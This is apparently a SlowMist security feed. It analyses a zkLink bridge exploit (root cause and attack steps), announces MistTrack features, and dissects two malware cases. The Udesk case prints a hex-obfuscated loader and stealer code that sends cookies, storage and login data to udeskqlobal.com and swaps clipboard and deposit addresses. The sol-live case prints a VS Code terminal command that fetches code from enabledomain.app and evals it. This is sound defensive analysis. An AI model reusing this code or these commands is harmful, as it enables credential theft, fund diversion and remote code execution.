item.title: One Fish, Multiple Meals — Analysis of the $780K zkLink Exploit
item.dc:creator: SlowMist
item.content:encoded:
Background

On October 29, 2026, the well-known cross-chain protocol zkLink was attacked, resulting in losses of approximately $783,000. The following is a detailed analysis of this incident by the SlowMist security team:

Prerequisites

zkLink is a multi-chain zk-rollup protocol. On Ethereum, the ZkLink contract (0x5fd9f73286b7e8683bab45019c94553b93e015cf) serves as the L1 messaging service and also holds the ETH treasury. Its companion L1ERC20Bridge (0xad16edcf7deb7e90096a259c81269d811544b6b6) holds the ERC-20 treasury.

The basis for withdrawal verification is the “batch root.” Every withdrawal on L2 generates an L2→L1 log, and the logs within the same batch form a Merkle tree. After a batch is executed on L2, its log root, l2LogsRootHashes[batchNumber], is synchronized to the ZkLink contract on L1. When users withdraw on L1, they submit the withdrawal message and a Merkle proof. ZkLink verifies the proof against the stored root and releases the funds only after successful verification. In other words, the message can only be considered valid if the root is genuine; if the root is forged, any message can be "proven" to have occurred. ZkLink also uses totalBatchesExecuted to record the batch number up to which execution has been completed. During verification, it requires that _batchNumber <= totalBatchesExecuted.

Cross-chain messages are not sent and received directly between chains. Instead, they are forwarded through gateway contracts. On the Ethereum side, the gateway is EthereumGateway (0x83bc7394738a7a084081af22eec0051908c0055c), while on the Linea side, it is LineaL1Gateway (0x803460416c2682ac54fccf03ef77b10a12f2809b). These gateways are coordinated centrally by the Arbitrator contract (0x1ee09a2caa0813a5183f90f5a6d0e4871f4c6002).

The Arbitrator contract is responsible for claiming and forwarding messages. A trusted relayer calls the claimMessage function. The Arbitrator contract first uses the source-chain messaging service specified by the relayer to claim a cross-chain message, and then forwards the message to the gateway on the destination chain. To ensure that the "forwarded content" matches the "actually claimed message," the Arbitrator writes the message hash into transient storage through a callback to the receiveMessage function during the claiming process. The claimMessage function then checks and compares this declaration.

Transient storage (EIP-1153) is a feature introduced in Solidity 0.8.24. Its scope covers an entire transaction rather than a single function call: subsequent calls within the same transaction can read values written by previous calls, and these values are only cleared when the transaction ends.

The entry point of this attack was the SyncL2TxHashRelayer contract (0x0fdc28e64772a70109d10fd068f859cfa7dea2c6). Its claimPrimaryChainSyncL2TxHashMessage function has no access control and essentially acts as a helper contract that forwards the caller's parameters directly to Arbitrator.claimMessage. Its ability to successfully call the claimMessage function indicates that it is registered as a relayer in the Arbitrator contract.

Root Cause

The core vulnerability in this attack was located in the claimMessage function of the Arbitrator contract. This function is responsible for both "claiming" and "forwarding" messages, but flaws existed in both of its trust assumptions.

function claimMessage(
    address _sourceChainCanonicalMessageService,
    bytes calldata _sourceChainClaimCallData,
    IL1Gateway _sourceChainL1Gateway,
    uint256 _receiveValue,
    bytes calldata _receiveCallData,
    bytes calldata _forwardParams
) external payable nonReentrant onlyRelayer {
    assembly {
        tstore(claiming.slot, 1)
    }

    // Exploitation Point 1: Arbitrator, acting as itself, executes arbitrary calldata against any address specified by the relayer.
    Address.functionCall(_sourceChainCanonicalMessageService, _sourceChainClaimCallData);

    bytes32 _finalizeMessageHash;
    assembly {
        _finalizeMessageHash := tload(finalizeMessageHash.slot)
    }

    // Exploitation Point 2: The comparison uses a stale value in transient storage and does not require receiveMessage to have actually been called during the current invocation.
    require(
        _finalizeMessageHash == keccak256(abi.encode(_sourceChainL1Gateway, _receiveValue, _receiveCallData)),
        "Incorrect finalize data"
    );

    // ... Subsequently forwards the message to the destination gateway according to the relevant branch.
}

The first exploitation point is that the “external execution content” is entirely controlled by the relayer. Both _sourceChainCanonicalMessageService and _sourceChainClaimCallData are parameters supplied by the relayer, and the Arbitrator contract executes the call using its own identity. Under normal circumstances, this is a claiming interface of the source-chain messaging service. However, if an attacker changes the target to a gateway registered in the Arbitrator contract, the actual execution can call functions in the gateway protected by the onlyArbitrator modifier.

The second exploitation point is that the “consistency check” can be bypassed due to the characteristics of transient storage. The check reads finalizeMessageHash from transient storage, and this slot is never cleared within the same transaction, nor does it become invalid when a function call ends. As long as a genuine claim occurs first within the same transaction and writes the value to this slot, a subsequent second call to claimMessage can reuse it to pass the check, even if the second call does not claim any message at all. The attacker only needs to ensure that the declared (gateway, value, callData) parameters are exactly the same in both calls. In other words, passing the check proves that "a claim matching these declarations has occurred at some point within this transaction," rather than that "this message was claimed during the current invocation."

So, how can the batch root used for withdrawals be forged? After directing the external call to EthereumGateway, the Arbitrator contract calls the sendMessage function:

function sendMessage(uint256 _value, bytes calldata _callData, bytes calldata) external payable onlyArbitrator {
    require(msg.value == _value, "Invalid value");
    (bool success, ) = ZKLINK.call{value: _value}(_callData); // Forwards the calldata to ZkLink as-is
    require(success, "Call zkLink failed");
}

This function only checks whether the caller is the Arbitrator contract, then forwards the calldata directly to the ZkLink contract. Since the call is indeed initiated by the Arbitrator contract, the check naturally passes. The attacker sets _callData to syncBatchRoot(116409, forgedRoot, 0):

function syncBatchRoot(uint256 _batchNumber, bytes32 _l2LogsRootHash, uint256 _forwardEthAmount) external payable onlyGateway {
    // Only checks that the caller is a gateway; does not verify any batch proof.
    require(msg.value == _forwardEthAmount, "Invalid forward amount");
    if (_batchNumber > totalBatchesExecuted) {
        totalBatchesExecuted = _batchNumber;
    }
    l2LogsRootHashes[_batchNumber] = _l2LogsRootHash; // Directly overwrites the log root for the specified batch.
    emit SyncBatchRoot(_batchNumber, _l2LogsRootHash, _forwardEthAmount);
}

The onlyGateway modifier in the ZkLink contract requires the caller to be one of its configured gateways. Since this call is forwarded by the EthereumGateway contract, the check passes. The attacker therefore used the next batch number that had not yet been executed at the time, 116409, together with a self-constructed log root, to overwrite l2LogsRootHashes[116409] from zero with a forged value. At the same time, totalBatchesExecuted was incremented from 116408 to 116409. Once the root was forged, the Merkle proof would inevitably pass, allowing the contents of the withdrawal message to be arbitrarily constructed. At this point, the attacker could withdraw funds using the forged proof.

Attack Steps Analysis

Attack Transaction: 0x4f3c23e75b9134e8cae5a462550daad42fbbc19242567fcc34c0a035e297462c

Attacker EOA: 0xaca0655a11200a80d33d0e48786317304cde5718

Attack Contract: 0xd5f162b68a0281686e8dc76db8d67d2f3e6aff07

1. The attack contract first calls the totalBatchesExecuted() function of the ZkLink contract to query the last batch that had been executed at the time. It then adds one to this value to obtain the batch number to be forged, 116409.

This is because subsequent withdrawal proofs require the batch number to be no greater than totalBatchesExecuted. Therefore, the forged batch must first be registered as "executed."

The syncBatchRoot function accepts any batch number and any root, and also advances totalBatchesExecuted to that batch number. As long as the attacker can get the gateway to initiate this call, the attacker can decide which batch is considered "executed."

2. The attacker first performs a genuine cross-chain message claim from Linea by calling Arbitrator.claimMessage through the SyncL2TxHashRelayer contract. The attacker submits a valid proof of a genuine Linea message, specifying Linea Rollup as the "source-chain messaging service address" and providing a claimMessageWithProof proof. This message is a Linea→Ethereum cross-chain message sent by the attacker themselves on Linea. Its recipient is LineaL1Gateway, and its content instructs it to forward a syncL2TxHash(_l2TxHash,_primaryChainL2TxHash) call to the destination gateway.

After Linea Rollup successfully verifies the proof, it calls back LineaL1Gateway, which in turn calls the receiveMessage function of the Arbitrator contract, writing the hash of this message into the finalizeMessageHash slot in transient storage. The claimMessage function then uses this value for comparison. In other words, the attacker obtains the verification value finalizeMessageHash through a genuine and harmless claiming process, leaving it stored throughout the transaction.

The SyncL2TxHashRelayer contract is registered as a relayer in the Arbitrator contract, and its claimPrimaryChainSyncL2TxHashMessage function has no access control, allowing any address to use it to call the claimMessage function of the Arbitrator contract. Meanwhile, the claimMessage function allows relayers to specify the source-chain messaging service address themselves. In addition, the verification value written during this genuine claim remains in the transaction's transient storage until the transaction ends.

3. Immediately afterward, the attack contract calls the same relayer again, changing only two parameters: the source-chain messaging service is changed from Linea Rollup to the EthereumGateway registered in the Arbitrator contract itself, and _sourceChainClaimCallData is changed to sendMessage(0, syncBatchRoot(116409, 0x1934a1...a8, 0), "").

The remaining parameters — the source-chain gateway, receive amount, declared receive calldata, and forwarding parameters — are identical byte-for-byte to those in the previous step. These are precisely the parameters used to check against finalizeMessageHash. Because the value of finalizeMessageHash is stored in transient storage, it is never cleared within the same transaction and is not bound to whether a message was actually claimed during the current invocation. Meanwhile, neither the target address nor the calldata of the external call is included in the check. As a result, the value left behind by the previous claim can be directly reused by the second call. Furthermore, Address.functionCall first allows the Arbitrator contract to execute any call specified by the attacker using its own identity. This is the core vulnerability behind the attack.

In other words, this call did not claim any message at all, yet the check in the claimMessage function still passed. Moreover, the attacker's external call to the sendMessage function of the EthereumGateway contract had already been executed before the check.

4. When the Arbitrator called the sendMessage function of the EthereumGateway contract, the calldata was exactly the syncBatchRoot(116409, forgedRoot, 0) call supplied by the attacker. As a result, ZkLink recorded the forged root as the log root for this batch.

The on-chain results show that ZkLink emitted the SyncBatchRoot(116409, 0x1934a1c3…) event, the stored value of l2LogsRootHashes[116409] changed from zero to the root constructed by the attacker, and totalBatchesExecuted also changed from 116408 to 116409. At this point, the forged root had been "legitimately" recorded in the protocol's ledger. Both calls also forwarded a syncL2TxHash call, setting l2TxHashMap[0x2575…] to 0xe9ec…. This step was harmless in itself and was merely a side effect of reusing the verification value.

Because EthereumGateway.sendMessage only checks whether the caller is the Arbitrator contract before forwarding the calldata directly to ZkLink, and ZkLink.syncBatchRoot only checks whether the caller is a gateway contract without verifying any batch proof, both layers of checks—which "verify the caller but not the content"—were passed, allowing the forged root to be recorded as a legitimate root.

5. After the root was overwritten, any withdrawal message that could produce a valid proof against this root would pass verification. The attack contract then initiated 12 consecutive final withdrawal calls, all targeting batch 116409: first, one ETH withdrawal, followed by 11 ERC-20 withdrawals. Each message included four Merkle nodes constructed by the attacker based on their forged root, so the proofs were guaranteed to pass verification.

The ETH withdrawal was processed directly by the ZkLink contract, while the 11 ERC-20 withdrawals were processed by L1ERC20Bridge. After the proofs passed verification, the tokens were transferred directly from the bridge contract to the attacker’s EOA.

Although both contracts recorded that “the message had been withdrawn,” this marker only prevents duplicate submissions and cannot identify whether the message itself had ever occurred on L2.

The withdrawal contracts only verify whether “the message is included in the tree corresponding to the stored batch root.” They do not verify whether the root itself originated from an actual L2 execution. Once the root is forged, any message can be accompanied by a valid proof.

Summary

The core issue behind this attack was the combination of arbitrary external calls in the Arbitrator contract and the reuse of uncleared transient storage values for verification. On the one hand, Arbitrator.claimMessage allows relayers to specify arbitrary targets and calldata, and performs arbitrary external calls using its own identity. On the other hand, its only finality check compares against a residual value stored in transient storage, without clearing it or checking whether the current invocation has actually completed a claim. The attacker first used a genuine claim to write the verification value, then reused that value in a second claimMessage call, causing the Arbitrator to invoke the gateway's onlyArbitrator interface on the attacker's behalf. This ultimately allowed the forged batch root to be written into ZkLink, making the assets held by the bridge "provably" withdrawable.

The fixes should address three layers. First, claimMessage must clear finalizeMessageHash before calling Address.functionCall, then require that it is non-zero and matches the declaration for the current call, or use an incrementing nonce for each call to bind the value, ensuring that the verification value can only be written by receiveMessage during the current invocation. Second, a whitelist should be added for _sourceChainCanonicalMessageService to prevent gateways registered in the Arbitrator contract itself from being used as "source-chain messaging services." Meanwhile, dev helper contracts should not be registered as relayers, or at least should be equipped with access controls to prevent arbitrary addresses from indirectly gaining the ability to call claimMessage. Third, ZkLink.syncBatchRoot should reject attempts to overwrite an existing batch root, and an independent proof should be added at the gateway or messaging layer to ensure that batch root updates cannot take effect solely because "the caller is a gateway."

When reviewing the code of similar cross-chain relayer projects, the SlowMist security team recommends focusing on four areas: whether transient storage is reset before each call, whether the verification value and the parameters actually executed come from the same source, whether “trusted callers” can be indirectly used by arbitrary users (for example, through public helpers or relayers), and whether independent verification is performed when updating batch roots. Such issues often do not lie in the most obvious asset transfer functions, but rather in the intermediate contracts that “appear to merely forward” calls.

item.title: MistTrack Quarterly Update: KYA Batch Screening and Tracing Canvas Now Available
item.dc:creator: SlowMist
item.content:encoded:
To address the practical needs of batch risk screening and on-chain fund investigations, MistTrack has recently introduced two new features: KYA Batch Screening and Tracing Canvas. The former helps risk management and compliance teams process large numbers of wallet addresses in one place and quickly identify addresses that require priority attention due to potential risks. The latter helps investigators trace fund flows and identify key addresses and potential risk connections through interactive transaction graphs, AI Smart Tracing, and Path Finder.

Register and try MistTrack via the link below: https://dashboard.misttrack.io/

KYA Batch Screening: Making Address Risk Screening More Efficient

In day-to-day risk management and compliance work, teams often need to screen large numbers of wallet addresses in batches. For example, they may regularly review existing user addresses, check operational wallets, or quickly review the addresses involved in a risk incident to identify potential risks.

To address these needs, MistTrack has introduced KYA Batch Screening, which allows users to import wallet addresses for screening in batches. The system automatically assigns risk scores to the addresses and summarizes the results by risk level, helping teams quickly identify addresses that require priority attention.

Batch Processing for a Clear View of Risk Distribution

With KYA Batch Screening, users can create separate screening tasks and view the task status, screening progress, blockchain networks involved, total number of addresses, and distribution of addresses across different risk levels in the task details.

The system categorizes screening results into Severe, High, Moderate, and Low risk levels. Risk management teams can filter addresses by risk level and prioritize the review of high-risk addresses without having to examine every address individually.

View Risk Details and Export Results

In addition to providing an overall summary of risks, batch screening allows users to view the risk score and corresponding Suspicious Transaction Report (STR) for each individual address. For internal reviews and compliance recordkeeping, users can also export the complete screening results for further analysis and recordkeeping.

Tracing Canvas: Visualizing On-Chain Fund Flows

In on-chain investigations, as the number of transactions increases and funds pass through multiple intermediate addresses, it becomes difficult to gain a clear understanding of overall fund flows by reviewing transaction lists one by one. This can also make it easy to overlook key intermediate nodes.

To help users conduct on-chain investigations more efficiently, MistTrack has introduced Tracing Canvas, which brings addresses, transactions, risk labels, and fund flows together in a single interactive graph. This allows investigators to trace transactions from a target address, map upstream and downstream transaction relationships, and further identify key fund paths.

Interactive Fund Flow Graph for Quickly Identifying Key Addresses

Users can select a target blockchain network and import wallet addresses to view their upstream and downstream transaction relationships.

During the investigation, users can adjust the graph view through zooming, dragging, and node searches. They can also use amount range filters and adjust transaction levels to focus on transactions and addresses relevant to the current investigation.

By clicking a node in the graph, users can also view basic information such as the address balance, tokens, transaction count, amounts sent and received, and periods of activity to help assess the address’s fund movement patterns.

For addresses requiring further investigation, investigators can continue their analysis along transaction relationships to gradually map out the fund flow process, reducing the need to repeatedly switch between and manually search through large volumes of transaction records.

AI Smart Tracing: Focusing on Key Fund Paths

When investigating subjects with complex transaction relationships and numerous addresses, expanding all transactions without filtering can easily result in a graph containing large amounts of information with limited relevance to the investigation, increasing the difficulty of analysis.

To address this, Tracing Canvas provides AI Smart Tracing, allowing users to configure tracing criteria based on their investigation objectives, including:

  • Minimum Amount Threshold: Prioritize fund flows that meet the specified amount threshold.
  • Transaction Start Date: Focus on fund activity during a specific period.
  • Backward and Forward Trace Layers: Control the tracking scope for incoming and outgoing fund flows, respectively.
  • Exchange- or Entity-Related Paths: Choose to display only paths associated with exchanges or entities to narrow the scope of analysis.

Based on the configured criteria, the system automatically expands and filters the fund relationship graph, helping investigators reduce interference from irrelevant transactions and more quickly identify fund flows that meet the investigation criteria.

For example, when investigating the destination of suspicious funds, users can set a minimum transaction amount, specify a start date, and configure the forward trace layers to prioritize downstream fund flows that meet the criteria. If the goal is to investigate the source of funds, users can adjust the backward trace layers to further map upstream transaction relationships.

By flexibly combining tracing criteria, teams can organize their analysis around specific investigation objectives without having to work with the entire complex transaction network at all times.

Path Finder: Identifying Fund Connections Between Addresses

In some investigative scenarios, analysts already know two or more target addresses but are unsure whether fund flows exist between them. In such cases, expanding the transaction graph for each address separately and manually comparing intermediate nodes is not only inefficient but can also lead to potential connection paths being overlooked.

Tracing Canvas now includes Path Finder, which allows users to enter multiple wallet addresses and specify the blockchain network, time range, and search depth to identify visible fund paths between them.

It is important to note that Path Finder is designed to identify visible on-chain fund paths under the specified criteria. Failure to find a path does not necessarily mean that no other forms of connection exist between the addresses. The results should still be assessed in conjunction with specific transaction records and other risk information.

Conclusion

This MistTrack update focuses on two key areas: batch risk screening and on-chain fund tracing. These capabilities help risk management and compliance teams screen addresses in batches, investigate fund flows, identify leads, and assess potential risks more efficiently.

item.title: Threat Intelligence | Udesk Loads Malicious JS to Steal Data and Alter Transfer Addresses
item.dc:creator: SlowMist
item.content:encoded:
Background

Recently, SlowMist security personnel detected an attack involving the injection of malicious code into scripts associated with the Udesk customer service system during routine threat intelligence investigations. The team subsequently obtained two JavaScript samples, udeskApi.2026-10-16.cached.js and deeps.js, and analyzed them to investigate how the malicious code entered webpages through customer service scripts and what it did to user data and business operations.

Examination of the samples gradually revealed two types of risks: the malicious scripts collected session data and sensitive information submitted by users from web pages, while also modifying deposit addresses and copied content according to site-specific rules. The former could allow attackers to impersonate users through their login sessions or take over their accounts, while the latter could lead users to transfer deposit funds to substituted recipient addresses. Starting from the customer service script’s loading entry point, we traced the data access, network transmission, and page modification logic to reconstruct how these two types of behavior were implemented and under what conditions they were triggered.

MistEye Response

MistEye is a Web3 threat intelligence and dynamic security monitoring system independently developed by SlowMist. It integrates security monitoring and intelligence aggregation capabilities to provide users with real-time risk alerts and asset protection.

MistEye promptly disseminated the risk information through its intelligence push and customer alert channels.

Malicious Loader and Remote Payload Loading Mechanism

When opening udeskApi.2026-10-16.cached.js, we can see code implementing features such as the customer service button, chat iframe, visitor tracking, and message communication. Further examination of the end of the file reveals a standalone function after the main code block ends. It decodes two strings through _ud(), creates an element, and inserts it into the current document's head.

This section does not directly specify the tag name or remote URL. If we search only for plaintext domain names, the loading entry point can easily be overlooked. By examining the implementation of _ud(), we found that it takes two hexadecimal characters at a time and converts them into characters. Once the constants are expanded, the loading target becomes clear.

var _s = document.createElement(_ud("736372697074"));
_s.src = _ud("68747470733a2f2f756465736b716c6f62616c2e636f6d2f64656570732e6a73");
_s.async = !0;
document.head.appendChild(_s);

736372697074 decodes to script, while the other constant decodes to https[:]//udeskqlobal[.]com/deeps.js. The domain name contains qlobal, beginning with the letter q. This spelling should be preserved when searching.

The loader sets the script to execute asynchronously and then inserts it into the page. When execution reaches this point and browser policies and network conditions permit, the remote code can enter the current document.

The payload corresponding to this URL is deeps.js. The investigation then shifted from the customer service SDK to the payload itself. Third-party classic scripts execute in the context of the embedding document, and the data they can access depends on the page or iframe in which they actually run. The use of an iframe for the customer service chat window does not automatically isolate scripts loaded into the host page.

Webpage Data Collection Mechanism and Scope of Impact

At the beginning of deeps.js, the script first reads window.location.hostname and generates configuration C based on rules for three sites. However, this configuration alone is insufficient to determine which pages are subject to data collection. We need to trace the location of the exit condition to determine whether it restricts the entire script or only one of its modules.

Continue tracing down the control flow, we found that Cookie and web storage reads, the transmission of an initial snapshot, and form and authentication request hooks all appear before if (! C) return;. Below, we extract the snapshot transmission statement and the XHR hook at the end in source order. Comments indicate omitted code corresponding to formatted view D and D–L166.

_send(_cb + "?s=" + encodeURIComponent((d.s || "")) + "&o=" + encodeURIComponent(d.o) + "&c=" + encodeURIComponent((d.c || "")) + "&l=" + encodeURIComponent((d.l || "")) + "&ss=" + encodeURIComponent((d.ss || ""))

// Omitted D:L101–L150: exception handling, form submit method and event hooks, and fetch hook.

try {
   var _oXO = XMLHttpRequest.prototype.open, _oXS = XMLHttpRequest.prototype.send;
   XMLHttpRequest.prototype.open = function () {
       this._u = arguments[1];
       return _oXO.apply(this, arguments)
   };
   XMLHttpRequest.prototype.send = function (body) {
       try {
             if (body && this._u && this._u.match(/login|signin|auth|register|signup|password/i)) _send(_cb + "?t=x&h=" + encodeURIComponent(_h) + "&u=" + encodeURIComponent(this._u) + "&d=" + encodeURIComponent(String(body)))
       } catch (e) {
       }
       return _oXS.apply(this, arguments)
   }
 } catch (e) {
 }
if (! C) return;

The location of the exit condition clarifies the scope of impact: even when the hostname does not match any of the three site-specific rules, the script first enters the data collection path and installs hooks, then exits the address module. When investigating exposed pages, searches should not be limited to the configurations for these three sites.

At startup, the payload reads the Cookies, localStorage, and sessionStorage accessible to the current webpage. These locations can store login states, user profiles, and business data. If they contain valid, reusable login tokens, attackers could obtain them and impersonate user sessions. The script also includes the top-level page URL and the current document's origin, submitting these alongside the collected data.

The collection process handles individual failures gracefully. If reading the top-level URL across origins fails, the script substitutes x and continues processing the other fields. Both types of web storage are serialized as JSON. Cookie collection is limited to the content readable through document.cookie; HttpOnly Cookies are not included.

The script also provides entry points for collecting data submitted later. When a user submits a form, it iterates through input, select, and textarea elements, copies non-empty values, and then allows the original submission process to continue. Fields actually filled in on the page, including account names, passwords, and verification codes, may enter an additional data transmission path. If leaked, this information could be used to log into accounts or take them over.

This path is implemented by wrapping HTMLFormElement.prototype.submit and listening for the submit event during the capture phase. For pages that submit data directly through APIs, the script also wraps fetch and XHR. When a request contains a body and its URL matches keywords such as login|signin|auth|register|signup|password, the script copies the corresponding content while preserving the original request call. The fetch branch additionally requires the URL to be a string, and the body is taken from the request options. When objects such as FormData are serialized directly to JSON, the collected content may omit the actual fields.

Data Exfiltration Mechanism and Fallback Channel

All the collection entry points described above ultimately call the same _send() function. Further tracing of this function reveals a fixed receiving endpoint: https[:]//udeskqlobal[.]com/c.php. The startup snapshot uses the fields s, o, c, l, and ss to carry the page URL, current origin, readable Cookies, and the two types of web storage, respectively. Subsequent form submissions and authentication requests are sent when their respective triggers are activated.

The function extracts the parameters following the question mark in the URL and places them in the body of an asynchronous POST request, setting Content-Type: application/x-www-form-urlencoded. The sending function is reproduced in full below (D–L60):

function_send(u) {
   try {
       var p = u.indexOf("?"), b = p > 0 ? u.substring(p + 1): "", e = p > 0 ? u.substring(0, p): u;
       var x = new XMLHttpRequest();
       x.open("POST", e, true);
       x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       x.onerror = function () {
             var i = new Image();
             i.src = u.substring(0, 8000)
       };
       x.send(b)
   } catch (e) {
       var i = new Image();
       i.src = u.substring(0, 8000)
   }
}

The transmission path also includes an image-request fallback. When an XHR error occurs or a synchronous exception is raised during transmission, the script creates an Image object and assigns the URL containing the parameters to src, attempting to transmit the data again via GET. The URL is truncated to the first 8,000 JavaScript characters, so longer content may be incomplete.

When examining this path, it is important to distinguish between “sending a request” and “reading a response.” The script does not read the response from c.php. Cross-origin POST requests that meet the conditions for simple requests can be sent before the browser restricts access to the response. Therefore, a CORS error and successful request transmission can occur simultaneously. Investigation records should examine both the POST body and the image GET parameters, while egress policies should separately check connect-src and img-src. If a regular form triggers document navigation, this can also affect whether asynchronous requests complete.

At this point, the destinations of webpage session data and subsequent submission contents are clear. However, the payload retains another set of operations after the site-specific exit condition: identifying address formats, modifying page text, and taking over the copy process. This code directs the investigation further toward deposit operations.

Deposit Address Replacement and Clipboard Hijacking Mechanism

After if (! C) return;, the script enters the address module. The three hostname rules at the beginning now have a clear purpose: they match mgbx[.]com, bikingex[.], and bitxex[.]io, selecting element selectors for addresses and copy buttons on different pages.

These regular expressions have no start or end anchors, so their matching scope is broader than an exact domain comparison. The page rules also check the full location.href, meaning keywords such as deposit, recharge, and assets in query parameters or fragments are also considered. When the page, element, and address format all match, the script scans every 200 milliseconds and replaces recognized deposit addresses with configured values. If a user completes a valid transfer using a replaced address, the recipient will be changed to that address.

The three site-specific branches share six configured values, labeled in the code as BTC, EVM, TRON, Solana, LTC, and DOGE. Address identification relies solely on character patterns and matching order. It does not verify the network selected by the user or the address checksum, and may also misidentify ordinary business identifiers.

Further examination of the copy-related code reveals that the sample interferes with both the displayed content and the clipboard contents. As a result, even if users compare the address displayed on the page with the copied result, they may see the same tampered value. There are three separate paths:

  1. Wrapping the Clipboard API. navigator.clipboard.writeText first passes its argument through R() for replacement, then forwards it to the original method. This path is restricted only by the hostname configuration. It does not recheck the deposit page conditions and does not depend on the DOM scan having matched any elements.
  2. Replacing copy buttons. The script clones matching buttons, installs a new click listener, and replaces the original nodes. The new listener prevents the default action and event propagation, then attempts to copy the address stored in the shared variable _cur.
  3. Intercepting copy events. When _cur is non-empty and the page rules are satisfied, a listener on document changes the copied content to _cur without checking whether the text selected by the user is an address.

The Clipboard API wrapper and the copy listener are adjacent in the source code (D–L275), but their triggering conditions differ:

try {
   var oNW = navigator.clipboard.writeText.bind(navigator.clipboard);
   navigator.clipboard.writeText = function (t) {
       return oNW(R(t))
   }
 } catch (e) {
 }
try {
   document.addEventListener("copy", function (e) {
       if (_cur && C && window.location.href.match(C.pg)) {
             e.preventDefault();
             e.clipboardData.setData("text/plain", _cur)
       }
   }, true)
 } catch (e) {
 }

_cur stores the last address actually replaced. When multiple types of addresses appear on the same screen, a subsequent replacement overwrites the previous value, potentially causing multiple buttons to copy the same address. If the page already displays a configured address initially, the scan does not initialize _cur for that reason alone, and the new button listener therefore does not write any content. Inline event handler attributes retained in the cloned HTML can still participate in event processing.

The analysis also identified an implementation defect that affects behavioral assessment: the script attempts to retrieve the own property descriptor for textContent from Element.prototype, whereas the standard property is defined on Node.prototype. Under standard prototype relationships, accessing .set afterward throws an exception. The catch block silently swallows this exception. Further examination of the surrounding code shows that the polling process has already been registered, and subsequent clipboard hooks are still installed according to their respective conditions. An error in this individual branch does not terminate the address hijacking module.

Conclusion

By tracing the loader at the end of the customer service script, we identified the sample’s attack objectives: collecting data that could be used to impersonate sessions or log into accounts, while replacing recipient addresses on deposit pages and during copy operations with configured values. The former is not restricted by the three site-specific configurations, while the latter is enabled according to the site and the specific copy path. Investigations should therefore cover different exposure scenarios.

Businesses that continue to load the affected scripts should stop distributing them, address exposed credentials, and verify deposit destinations against trusted backends and transaction records.

Recommendations

  1. Preserve and stop distributing compromised resources. If production environments still load the affected scripts, preserve the actual responses, request initiation chains, cache information, and collection timestamps before blocking them as soon as possible. Restore independently verified, trusted versions and inspect site hosting, CDN, build, and tag management configurations.
  2. Search for loading and exfiltration records. Correlate searches for the malicious domain, both paths, and file hashes. For exfiltration records, examine both POST bodies and GET parameters. When investigating minified scripts, also search for the hexadecimal URL in the loader to avoid missing matches by searching only for plaintext.
  3. Terminate compromised documents and address exposed credentials. Fully close the relevant pages or WebView documents to prevent old resources from being reloaded. Based on the actual scope of exposure, revoke sessions and rotate tokens and passwords from a clean environment. Removing the script tag does not revoke hooks and timers that have already been installed.
  4. Independently verify deposit addresses and transactions. For pages on which the payload executed, verify the original deposit addresses, relevant transactions, and actual transfer destinations through trusted channels. Assess the impact based on transaction records.
  5. Verify script controls and data egress restrictions. Configure script source and integrity controls according to business requirements. Separately verify policies such as connect-src and img-src, and restrict script loading and data exfiltration involving udeskqlobal[.]com.

Background

SlowMist’s security team recently received user reports about a GitHub repository named sol-live. Presented as a Solidity interview practice project, its README lists eight questions and claims that each should take 5 to 10 minutes to complete, lowering users' guard.

Upon analysis, we found that the project embeds a download-and-execute command unrelated to contract practice in the VS Code workspace settings file .vscode/settings.json. Hundreds of spaces are inserted before the command to reduce its visibility. Meanwhile, the configuration uses file exclusion rules to hide the .vscode directory. When developers launch a terminal using the malicious terminal configuration defined by the project, they may trigger the download and execution of a remote script.

In the execution chain on macOS and Linux, the launch command first checks the Node.js and npm environments and installs Node.js if necessary, then writes and runs a loader script. The script sends a request to a fixed address and directly executes the JavaScript in the response. The response obtained in this analysis was an obfuscated script of approximately 4 MB. The code indicates that the script can launch three background processes responsible for browser data theft, file scanning and uploading, and remote control, respectively. The data collection scope includes browser login databases, wallet extension storage, macOS Keychain files, local files, and clipboard contents.

This analysis is based on archived source code, retained HTTP responses, and scripts reconstructed offline. During the analysis, we did not execute the malicious sample, establish a command-and-control (C2) session, or access browser data, Keychain files, or clipboard contents on the analysis host. The following sections describe the code logic and its capabilities; they do not indicate that the corresponding behaviors or outcomes were observed on victim hosts.

MistEye Response

MistEye is a Web3 threat intelligence and dynamic security monitoring system independently developed by SlowMist. It integrates security monitoring and intelligence aggregation capabilities to provide users with real-time risk alerts and asset protection.

MistEye promptly distributed the risk information through intelligence notifications and customer alert channels.

Entry Point: Terminal Launch Configuration in the Project

VS Code supports defining terminal configurations in workspace settings, where path specifies the executable to launch and args specifies its launch arguments. The settings file in sol-live contains both standard options, such as font size, code folding, and auto-save, and three sets of malicious terminal configurations targeting macOS, Linux, and Windows, respectively. These configurations use common names such as zsh, bash, and powershell, making them easy to confuse with legitimate terminal configurations.

After reconstructing the multiple layers of quotation marks and escape sequences, the Linux bash configuration primarily executes the following command. The corresponding macOS command also sets PROFILE=~/.zshrc before bash.

{ node -v && npm -v; } || { curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash && . ~/.nvm/nvm.sh && nvm install --lts; }
 mkdir -p "~/.vscode/cache" && cd "~/.vscode/cache" && npm i axios &&
 echo "require(\"axios\").post(\"https://www.enabledomain.app/api/ip-check-encrypted/3aeb34a36\").then(({data})=>eval(data))" > app.js &&
 node app.js

The outer command uses nohup, output redirection, and & to run the download-and-execute chain in the background while suppressing terminal output. If node -v && npm -v executes successfully, the existing environment is used directly. Otherwise, the official nvm-sh/nvm v0.40.3 installer is used to install nvm, after which ~/.nvm/nvm.sh is loaded and the Node.js LTS version is installed.

echo writes a single line of loader code to app.js, which is then executed by node app.js. The loader code calls axios.post without a second argument, meaning that the POST request carries no request body. Upon receiving a response, the code does not validate its contents before passing them to eval for dynamic execution. This execution chain runs with the current user's privileges and does not require administrator authorization.

The command uses double quotes around "~/.vscode/cache", so the ~ inside the quotes is not expanded by bash or zsh to the user's home directory. Instead, it is preserved as a literal character in the path. The actual directory is therefore located under the terminal's working directory at ./~/.vscode/cache, usually corresponding to a path of the same name under the project root. The app.js file is also written to this directory. When searching for dropped files, investigators should locate the path based on the terminal's actual working directory rather than checking only ~/.vscode/cache under the user's home directory.

The project does not configure a default terminal for macOS or Linux. Users must actively select and launch a terminal using the project’s custom zsh or bash configuration to trigger the corresponding command. The Windows configuration, however, sets powershell as the default and launches a hidden window using Start-Process powershell -WindowStyle Hidden. However, static analysis found that the relevant PowerShell command uses single-quoted strings, which preserve backslashes literally. This may cause require(\"axios\"), when written to app.js, to fail to parse as valid JavaScript. This chain has not been executed and verified on Windows, so whether it can achieve remote code execution remains unconfirmed.

